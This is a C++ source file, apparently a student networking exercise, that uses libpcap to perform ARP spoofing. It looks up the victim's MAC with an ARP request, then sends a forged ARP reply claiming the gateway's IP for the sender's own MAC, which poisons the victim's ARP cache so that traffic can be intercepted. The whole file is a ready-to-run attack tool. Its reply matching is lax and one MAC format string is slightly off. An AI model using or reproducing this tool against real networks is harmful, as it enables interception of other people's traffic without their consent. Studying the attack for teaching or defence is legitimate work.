#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
//my IP
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>

#define ETHERTYPE_ARP 0x0806

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <victim ip> <gateway ip>\n");
	printf("sample: send-arp-test eth0 192.168.47.71 192.168.43.1\n");
}

void Send_ARP_Request(pcap_t* handle, char* smac, char* dmac, char* sip, char* tmac, char* tip){
	EthArpPacket packet;
        packet.eth_.dmac_ = Mac(dmac);
        packet.eth_.smac_ = Mac(smac);
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(smac);
        packet.arp_.sip_ = htonl(Ip(sip));
        packet.arp_.tmac_ = Mac(tmac);
        packet.arp_.tip_ = htonl(Ip(tip));
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
}

void Send_ARP_Reply(pcap_t* handle, char* smac, char* dmac, char* sip, char* tmac, char* tip){
        EthArpPacket packet;
        packet.eth_.dmac_ = Mac(dmac);
        packet.eth_.smac_ = Mac(smac);
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE; 
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(smac);    
        packet.arp_.sip_ = htonl(Ip(sip));
        packet.arp_.tmac_ = Mac(tmac);    
        packet.arp_.tip_ = htonl(Ip(tip));
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
}


void Get_My_IP(char* ip_buff,char* device){
	struct ifreq ifr;
	char IP[40];
	int my_socket;
	my_socket= socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, device, IFNAMSIZ);
	ioctl(my_socket, SIOCGIFADDR, &ifr);
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IP, sizeof(struct sockaddr));
	sprintf(ip_buff,"%s", IP);
}


void Get_My_Mac(char *mac_buff, char* device){
	struct ifreq ifr;
	int my_socket;
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	strcpy(ifr.ifr_name, device);
	ioctl(my_socket, SIOCGIFHWADDR, &ifr);
unsigned char *tmp = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	sprintf(mac_buff,"%02X:%02X:%02X:%02X:%02X:%0X", tmp[0], tmp[1], tmp[2], tmp[3], tmp[4], tmp[5]);;
}


int Get_Victim_Mac(const u_char* recv_pkt, Mac my_mac, char* victim_mac){
	EthHdr* e_header;
	e_header = (EthHdr*)recv_pkt;
	if(e_header->smac_ == my_mac)
		return 0;

	if(ntohs(e_header->type_) == ETHERTYPE_ARP){
		sprintf(victim_mac,"%02x:%02x:%02x:%02x:%02x:%02x",e_header->smac_[0], e_header->smac_[1], e_header->smac_[2], e_header->smac_[3], e_header->smac_[4], e_header->smac_[5]);
		return 1;
	}
	return 0; 
}


int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char my_ip[40];
	char my_mac[40];
	char victim_mac[40];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	if(pcap_datalink(handle) == DLT_EN10MB){
		Get_My_IP(my_ip, argv[1]);
		Get_My_Mac(my_mac, argv[1]);
		Send_ARP_Request(handle, my_mac, "ff:ff:ff:ff:ff:ff", my_ip, "00:00:00:00:00:00", argv[2]);
		while(true){
			struct pcap_pkthdr* header;
        		const u_char* packet;
			pcap_next_ex(handle, &header, &packet);
			if(Get_Victim_Mac(packet, (Mac)my_mac, victim_mac))
				break;
		}
		printf("%s\n", victim_mac);
	//	for(int i=0; i<30; i++)
			Send_ARP_Reply(handle, my_mac, victim_mac, argv[3], victim_mac, argv[2]);
		pcap_close(handle);
	}
	else
		printf("Not Ethernet! try again\n");
}
